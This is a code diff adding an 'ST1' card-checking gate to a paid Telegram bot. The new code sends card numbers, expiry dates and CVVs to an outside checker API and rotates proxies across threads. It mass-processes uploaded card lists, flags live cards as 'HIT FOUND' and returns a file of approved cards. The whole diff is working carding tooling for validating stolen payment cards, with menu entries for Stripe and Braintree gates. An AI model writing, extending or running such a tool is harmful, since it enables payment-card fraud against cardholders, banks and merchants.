@@ -407,6 +407,151 @@ def run_automated_process(card_num, card_cvv, card_yy, card_mm, proxies=None):
     except Exception as e:
         return f"Error: {str(e)}"
 
+# ============================================================
+#  ST1 Gate — hiapi checker
+# ============================================================
+ST1_API_URL = "https://ck.hiapi.club/api/check3"
+
+
+def format_proxy_for_api(proxy_str):
+    """Format proxy to ip:port:user:pass for the API param."""
+    if not proxy_str:
+        return None
+    parts = proxy_str.strip().split(':')
+    if len(parts) == 2:
+        return proxy_str.strip()
+    elif len(parts) == 4:
+        return proxy_str.strip()
+    return None
+
+
+def run_st1_check(card_num, card_mm, card_yy, card_cvv, proxy_str=None):
+    """Single card check via hiapi."""
+    try:
+        card_param = f"{card_num}|{card_mm}|{card_yy}|{card_cvv}"
+        params = {"c": card_param}
+        if proxy_str:
+            params["p"] = proxy_str
+
+        resp = requests.get(ST1_API_URL, params=params, timeout=30)
+        text = resp.text.strip()
+
+        # Parse response — typically returns status info
+        if resp.status_code != 200:
+            return f"Error: API returned {resp.status_code}"
+
+        # Try to detect approved/declined from response
+        lower = text.lower()
+        if any(w in lower for w in ["approved", "success", "live", "charged"]):
+            return f"Approved | {text}"
+        elif any(w in lower for w in ["declined", "dead", "fail", "insufficient", "do not honor"]):
+            return f"Declined | {text}"
+        else:
+            return f"Unknown | {text}"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
+def process_single_st1(entry, proxies_list, user_id):
+    """Process a single card entry for ST1 gate."""
+    raw_proxy = random.choice(proxies_list) if proxies_list else None
+    api_proxy = format_proxy_for_api(raw_proxy)
+
+    try:
+        c_data = entry.split('|')
+        if len(c_data) == 4:
+            c_num, c_mm, c_yy, c_cvv = [x.strip() for x in c_data]
+
+            # BIN FILTER
+            user_bin_list = user_bins.get(user_id)
+            if user_bin_list:
+                if not any(c_num.startswith(b) for b in user_bin_list):
+                    return "SKIPPED | BIN not allowed"
+
+            result = run_st1_check(c_num, c_mm, c_yy, c_cvv, api_proxy)
+        else:
+            result = "Error: Invalid Format"
+    except Exception as e:
+        result = f"Error: {str(e)}"
+
+    return result
+
+
+def run_st1_processing(lines, user_id, on_progress=None, on_complete=None, threads=DEFAULT_THREADS):
+    """Mass processing runner for ST1 gate."""
+    # Load global proxies
+    proxies_list = []
+    if os.path.exists(PROXIES_FILE):
+        with open(PROXIES_FILE, 'r') as f:
+            proxies_list = [line.strip() for line in f if line.strip()]
+
+    # Load user's personal proxies and merge
+    user_proxy_file = os.path.join(USER_PROXIES_DIR, f"{user_id}.txt")
+    if os.path.exists(user_proxy_file):
+        with open(user_proxy_file, 'r') as f:
+            personal = [line.strip() for line in f if line.strip()]
+            proxies_list = proxies_list + personal
+
+    total = len(lines)
+    results = {"approved": 0, "declined": 0, "errors": 0, "skipped": 0, "total": total, "approved_list": []}
+    results_lock = threading.Lock()
+    processed = [0]
+
+    def worker(entry):
+        if cancel_flags.get(user_id):
+            return None
+        entry = entry.strip()
+        if not entry:
+            return ("", "INVALID", "Empty line", "error")
+
+        result = process_single_st1(entry, proxies_list, user_id)
+
+        if "SKIPPED" in result:
+            category = "skipped"
+            status = "SKIPPED"
+        elif "Approved" in result:
+            category = "approved"
+            status = "APPROVED"
+        elif "Declined" in result:
+            category = "declined"
+            status = "DECLINED"
+        else:
+            category = "error"
+            status = "ERROR"
+
+        detail = result.split(" | ", 1)[1] if " | " in result else result
+        return (entry, status, detail, category)
+
+    max_workers = max(1, min(threads, total, 10))
+
+    with ThreadPoolExecutor(max_workers=max_workers) as pool:
+        futures = {pool.submit(worker, line): i for i, line in enumerate(lines)}
+        for fut in as_completed(futures):
+            if cancel_flags.get(user_id):
+                break
+            result = fut.result()
+            if result is None:
+                continue
+            entry, status, detail, category = result
+            with results_lock:
+                if category == "approved":
+                    results["approved"] += 1
+                    results["approved_list"].append(entry)
+                elif category == "declined":
+                    results["declined"] += 1
+                elif category == "skipped":
+                    results["skipped"] += 1
+                else:
+                    results["errors"] += 1
+                processed[0] += 1
+                idx = processed[0]
+            if on_progress:
+                on_progress(idx, total, results, entry, status, detail)
+
+    if on_complete:
+        on_complete(results)
+    return results
+
 
 def format_proxy(proxy_str):
     if not proxy_str: return None
@@ -544,13 +689,15 @@ def fmt_start(is_adm=False):
     base = (
         "<b>Data Processing Bot</b>\n"
         f"{'─' * 28}\n\n"
-        "Upload a <b>.txt</b> file, then reply to it with <b>/auth</b>\n\n"
+        "Upload a <b>.txt</b> file, then reply with a gate command\n\n"
+        "<b>Gates:</b>\n"
+        "  /auth       — Stripe Auth\n"
+        "  /st1        — ST1 Checker (single + mass)\n"
+        "  /nonvbv     — Braintree Non-VBV (coming soon)\n"
+        "  /charge     — Stripe Checkout $3 (coming soon)\n\n"
         "<b>Commands:</b>\n"
         "  /start      — Show this menu\n"
         "  /redeem     — Unlock access\n"
-        "  /auth       — Stripe Auth\n"
-        "  /nonvbv     — Braintree Non-VBV (coming soon)\n"
-        "  /charge     — Stripe Checkout $3 (coming soon)\n"
         "  /bin        — Set BIN filter\n"
         "  /clearbin   — Clear BIN filter\n"
         "  /cancel     — Stop active task\n"
@@ -574,9 +721,8 @@ def fmt_start(is_adm=False):
 
     base += (
         "<b>How to use:</b>\n"
-        "  1. Send a .txt file\n"
-        "  2. Reply to the file with /auth\n"
-        "  3. Wait for results\n"
+        "  <b>Mass:</b> Send a .txt → reply with /st1 or /auth\n"
+        "  <b>Single:</b> /st1 CC|MM|YY|CVV\n"
         f"{FOOTER}"
     )
     return base
@@ -1113,7 +1259,200 @@ def handle_update(update):
         send_message(chat_id, f"<b>Access Granted</b>\n\nDuration: <code>{dur_label}</code>\nLine Limit: <code>{limit_label}</code>\nWelcome aboard.{FOOTER}")
         return
 
-    # --- /auth (Stripe Auth) ---
+    # --- /st1 (ST1 Checker — single + mass) ---
+    if text.startswith("/st1"):
+        if not is_authorized(user_id):
+            send_message(chat_id, fmt_unauthorized())
+            return
+
+        parts = text.split(maxsplit=1)
+
+        # --- Single card mode: /st1 CC|MM|YY|CVV ---
+        if len(parts) == 2 and '|' in parts[1]:
+            card_str = parts[1].strip()
+            c_data = card_str.split('|')
+            if len(c_data) != 4:
+                send_message(chat_id, "<b>Invalid format.</b>\n\nUse: <code>/st1 CC|MM|YY|CVV</code>" + FOOTER)
+                return
+
+            c_num, c_mm, c_yy, c_cvv = [x.strip() for x in c_data]
+
+            # BIN filter
+            user_bin_list = user_bins.get(user_id)
+            if user_bin_list and not any(c_num.startswith(b) for b in user_bin_list):
+                send_message(chat_id, f"<b>Skipped</b>\n\nBIN <code>{c_num[:6]}</code> not in your filter." + FOOTER)
+                return
+
+            # Load proxies for single check
+            proxies_list = []
+            if os.path.exists(PROXIES_FILE):
+                with open(PROXIES_FILE, 'r') as f:
+                    proxies_list = [l.strip() for l in f if l.strip()]
+            user_proxy_file = os.path.join(USER_PROXIES_DIR, f"{user_id}.txt")
+            if os.path.exists(user_proxy_file):
+                with open(user_proxy_file, 'r') as f:
+                    proxies_list += [l.strip() for l in f if l.strip()]
+
+            raw_proxy = random.choice(proxies_list) if proxies_list else None
+            api_proxy = format_proxy_for_api(raw_proxy)
+
+            send_message(chat_id, f"<b>ST1 Checking...</b>\n\n<code>{c_num[:6]}xxxxxx</code>" + FOOTER)
+
+            result = run_st1_check(c_num, c_mm, c_yy, c_cvv, api_proxy)
+
+            if "Approved" in result:
+                emoji = "✅"
+                status_label = "APPROVED"
+            elif "Declined" in result:
+                emoji = "❌"
+                status_label = "DECLINED"
+            else:
+                emoji = "⚠️"
+                status_label = "ERROR"
+
+            detail = result.split(" | ", 1)[1] if " | " in result else result
+            send_message(
+                chat_id,
+                f"{emoji} <b>{status_label}</b>\n"
+                f"{'─' * 28}\n\n"
+                f"Card: <code>{card_str}</code>\n"
+                f"Response: <code>{detail}</code>"
+                + FOOTER
+            )
+            return
+
+        # --- Mass mode: reply to .txt file ---
+        reply = msg.get("reply_to_message")
+        if not reply or not reply.get("document"):
+            send_message(chat_id,
+                "<b>ST1 Checker</b>\n\n"
+                "<b>Single:</b> <code>/st1 CC|MM|YY|CVV</code>\n"
+                "<b>Mass:</b> Reply to a .txt file with /st1" + FOOTER)
+            return
+
+        doc = reply["document"]
+        fname = doc.get("file_name", "")
+        if not fname.lower().endswith(".txt"):
+            send_message(chat_id, "<b>Only .txt files are accepted.</b>" + FOOTER)
+            return
+
+        with active_lock:
+            if user_id in active_users:
+                send_message(chat_id, "<b>You already have a task running.</b>" + FOOTER)
+                return
+            active_users.add(user_id)
+
+        cancel_flags.pop(user_id, None)
+
+        content = download_file(doc["file_id"])
+        if not content:
+            with active_lock:
+                active_users.discard(user_id)
+            send_message(chat_id, "<b>Failed to download file.</b>" + FOOTER)
+            return
+
+        file_lines = [l.strip() for l in content.splitlines() if l.strip()]
+        if not file_lines:
+            with active_lock:
+                active_users.discard(user_id)
+            send_message(chat_id, "<b>File is empty.</b>" + FOOTER)
+            return
+
+        if len(file_lines) > 4000:
+            with active_lock:
+                active_users.discard(user_id)
+            send_message(chat_id, f"<b>File Too Large</b>\n\nMax <code>4000</code> lines.\nYour file has <code>{len(file_lines)}</code> lines." + FOOTER)
+            return
+
+        user_limit = get_user_line_limit(user_id)
+        if user_limit and len(file_lines) > user_limit:
+            with active_lock:
+                active_users.discard(user_id)
+            send_message(chat_id, f"<b>File Too Large</b>\n\nYour key allows <code>{user_limit}</code> lines.\nYour file has <code>{len(file_lines)}</code> lines." + FOOTER)
+            return
+
+        init_resp = send_message(
+            chat_id,
+            "<b>ST1 Engine Starting...</b>",
+            reply_markup=stop_button_markup(user_id)
+        )
+        progress_msg_id = init_resp.get("result", {}).get("message_id")
+
+        def _run_st1():
+            start_time = time.time()
+            last_edit_time = [0]
+
+            def on_progress(idx, total, results, entry, status, detail):
+                if status == "APPROVED":
+                    status_text = "APPROVED — " + detail
+                elif status == "DECLINED":
+                    status_text = "DECLINED — " + detail
+                elif status == "SKIPPED":
+                    status_text = "SKIPPED — " + detail
+                else:
+                    status_text = "ERROR — " + detail
+
+                if status == "APPROVED":
+                    send_message(
+                        chat_id,
+                        f"<b>HIT FOUND</b>\n"
+                        f"{'─' * 28}\n\n"
+                        f"<code>{entry}</code>\n\n"
+                        f"{detail}\n"
+                        f"{'─' * 28}\n"
+                        f"  [{idx}/{total}]"
+                    )
+
+                now = time.time()
+                if progress_msg_id and (now - last_edit_time[0] >= 3 or idx == total):
+                    last_edit_time[0] = now
+                    markup = None if idx == total else stop_button_markup(user_id)
+                    edit_message(
+                        chat_id,
+                        progress_msg_id,
+                        fmt_live(idx, total, results, start_time, entry=entry, status_text=status_text, done=(idx == total)),
+                        reply_markup=markup
+                    )
+
+            def on_complete(results):
+                cancel_flags.pop(user_id, None)
+                update_user_stats(user_id, results)
+
+                if progress_msg_id:
+                    edit_message(
+                        chat_id,
+                        progress_msg_id,
+                        fmt_live(
+                            results['total'], results['total'], results, start_time,
+                            entry="Finished", status_text="Completed", done=True
+                        )
+                    )
+
+                send_message(chat_id, fmt_results(results))
+
+                if results["approved_list"]:
+                    filename = f"st1_approved_{int(time.time())}.txt"
+                    filepath = os.path.join(DATA_DIR, filename)
+                    with open(filepath, "w") as f:
+                        for e in results["approved_list"]:
+                            f.write(e + "\n")
+                    with open(filepath, "rb") as f:
+                        requests.post(
+                            f"{API_BASE}/sendDocument",
+                            data={"chat_id": chat_id},
+                            files={"document": f}
+                        )
+
+                with active_lock:
+                    active_users.discard(user_id)
+
+            run_st1_processing(file_lines, user_id, on_progress=on_progress, on_complete=on_complete)
+
+        t = threading.Thread(target=_run_st1, daemon=True)
+        t.start()
+        return
+
+
     if text == "/auth":
         if not is_authorized(user_id):
             send_message(chat_id, fmt_unauthorized())
